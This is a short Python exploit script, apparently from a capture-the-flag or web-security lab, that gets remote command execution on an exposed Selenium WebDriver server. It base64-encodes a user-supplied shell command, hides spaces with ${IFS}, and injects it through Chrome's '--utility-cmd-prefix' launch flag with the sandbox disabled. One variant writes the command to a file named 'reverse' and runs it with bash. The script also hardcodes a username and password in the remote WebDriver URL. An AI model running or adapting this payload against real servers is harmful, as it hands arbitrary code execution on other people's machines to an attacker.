from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from webdriver_manager.chrome import ChromeDriverManager
from base64 import b64encode
import sys

#command='echo asdfasdfasdf > /tmp/asdfasdf'
command = sys.argv[1]

payload=f"sh -c echo${{IFS}}{b64encode(command.encode()).decode()}|base64${{IFS}}-d>reverse;bash${{IFS}}reverse" #payload just for POC
payload=f"sh -c echo${{IFS}}{b64encode(command.encode()).decode()}|base64${{IFS}}-d|bash" #payload just for POC
#payload="/usr/bin/ping 8.8.8.8"
print(payload)

# execute chrome arguments
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--headless")
chrome_options.add_argument("--utility-and-browser")
chrome_options.add_argument("--utility-cmd-prefix="+payload)

driver = webdriver.Remote(
   #command_executor='http://localhost:12322/wd/hub',
   command_executor='http://team0:LnOyUrIrkJRDhetbHtOlIXKlweKVysFv@team0.websec.pw:12321/',
   desired_capabilities=DesiredCapabilities.CHROME,
   options=chrome_options
)
"""
chrome_options.binary_location='/opt/google/chrome/chrome'

driver = webdriver.Chrome(ChromeDriverManager(log_level=0).install(), options=chrome_options, desired_capabilities=DesiredCapabilities.CHROME)
"""

driver.get("https://google.com")
print(driver.page_source)
driver.quit()
